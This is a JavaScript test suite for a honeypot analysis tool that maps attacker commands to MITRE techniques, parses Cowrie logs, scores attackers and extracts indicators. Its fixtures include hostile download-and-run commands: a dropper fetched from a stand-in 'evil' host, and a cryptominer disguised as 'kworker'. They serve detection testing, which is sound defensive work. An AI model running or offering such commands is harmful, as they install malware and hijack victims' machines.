const assert = require("assert");
const {
  buildProfiles, buildSummary, mapMitre, normalizeEvent,
  parseCowrie, generateAlerts, extractIOCs, buildTacticMatrix, generateCSV
} = require("../server");

console.log("Running HoneyTrace AI test suite…\n");

// 1. MITRE mapping
const dropper = normalizeEvent({
  sourceIp:"10.10.10.10", country:"Lab", username:"root", password:"toor",
  eventType:"cowrie.command.input",
  command:"wget http://evil.test/x -O /tmp/.x; chmod +x /tmp/.x; /tmp/.x"
});
const ids = mapMitre(dropper).map(m => m.id);
assert(ids.includes("T1105"), "wget → T1105");
assert(ids.includes("T1059"), "shell → T1059");
assert(ids.includes("T1027"), "chmod → T1027");
console.log("✓ MITRE rule matching");

// 2. Cowrie import
const cowrie = parseCowrie(
  '{"eventid":"cowrie.command.input","timestamp":"2026-06-20T00:00:00Z","src_ip":"1.2.3.4","username":"root","input":"whoami"}\n' +
  '{"eventid":"cowrie.login.failed","timestamp":"2026-06-20T00:01:00Z","src_ip":"1.2.3.4","username":"admin","password":"admin"}'
);
assert.strictEqual(cowrie.length, 2);
assert.strictEqual(cowrie[0].sourceIp, "1.2.3.4");
console.log("✓ Cowrie JSONL parsing");

// 3. Profiles & summary
const profiles = buildProfiles([dropper, ...cowrie]);
assert(profiles.length >= 2);
assert(profiles.some(p => p.sourceIp === "10.10.10.10" && p.aiProfile.score > 10));
const summary = buildSummary([dropper, ...cowrie]);
assert.strictEqual(summary.totalEvents, 3);
assert(summary.mitre.length > 0);
console.log("✓ Profiles and summary");

// 4. Alert triage
const miner = normalizeEvent({
  sourceIp:"5.5.5.5", country:"Test", eventType:"cowrie.command.input",
  command:"wget http://bad.host/xmrig -O /tmp/kworker; chmod +x /tmp/kworker; /tmp/kworker stratum+tcp://pool.test:3333"
});
const alerts = generateAlerts(buildProfiles([miner]));
assert(alerts.length > 0, "Mining event should trigger alerts");
assert(alerts.some(a => a.severity === "critical"), "At least one critical alert");
console.log("✓ Alert triage");

// 5. IOC extraction
const iocs = extractIOCs([normalizeEvent({sourceIp:"1.1.1.1", command:"wget http://evil.example.com/payload.sh -O /tmp/.x"})]);
assert(iocs.urls.length > 0, "URLs should be extracted");
assert(iocs.files.some(f => f.includes("/tmp")), "Temp files should be extracted");
console.log("✓ IOC extraction");

// 6. Tactic matrix
const tactics = buildTacticMatrix([dropper, ...cowrie, miner]);
assert(Array.isArray(tactics) && tactics.length > 0);
assert(tactics.every(t => t.tactic && t.techniques.length > 0));
console.log("✓ Tactic matrix");

// 7. CSV export
const csv = generateCSV([dropper]);
assert(csv.includes("Attacker IP"), "CSV plain-English headers");
assert(csv.includes("10.10.10.10"), "CSV includes attacker IP");
assert(csv.includes("What The Hacker Was Doing"), "CSV includes plain-English column");
assert.strictEqual(csv.trim().split("\n").length, 2, "Header + 1 row");
console.log("✓ CSV export (plain-English)");

// 8. Score breakdown
const p = buildProfiles([dropper])[0];
assert(typeof p.aiProfile.confidence === "number");
assert(p.aiProfile.score >= 0 && p.aiProfile.score <= 100);
assert(Array.isArray(p.aiProfile.breakdown), "Score breakdown should be an array");
console.log("✓ Score breakdown and confidence");

// 9. Risk is not always 100
const simpleLogin = normalizeEvent({sourceIp:"2.2.2.2", country:"Test", eventType:"cowrie.login.failed", username:"admin", password:"admin"});
const simpleProfile = buildProfiles([simpleLogin])[0];
assert(simpleProfile.aiProfile.score < 100, "Simple brute force should not be 100");
assert(simpleProfile.aiProfile.risk !== "Critical", "Single login attempt should not be Critical");
console.log("✓ Risk scoring is balanced (not always 100)");

console.log("\n✅ All 9 tests passed.");
